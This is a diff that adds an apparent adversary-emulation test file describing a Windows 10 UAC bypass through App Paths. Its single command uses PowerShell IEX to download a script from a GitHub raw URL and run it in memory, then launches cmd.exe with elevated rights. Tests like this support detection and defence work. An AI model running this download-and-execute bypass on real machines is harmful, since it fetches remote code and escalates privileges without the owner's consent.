@@ -1,0 +1,8 @@
+#TechniqueName: Command and Scripting Interpreter: PowerShell
+#AtomicTestName: Invoke-AppPathBypass
+#Description: Note: Windows 10 only. Upon execution windows backup and restore window will be opened.&&Bypass is based on: https://enigma0x3.net/2017/03/14/bypassing-uac-using-app-paths/&
+#Language: cmd
+
+#commands
+Powershell.exe "IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/enigma0x3/Misc-PowerShell-Stuff/a0dfca7056ef20295b156b8207480dc2465f94c3/Invoke-AppPathBypass.ps1'); Invoke-AppPathBypass -Payload 'C:\Windows\System32\cmd.exe'"
+
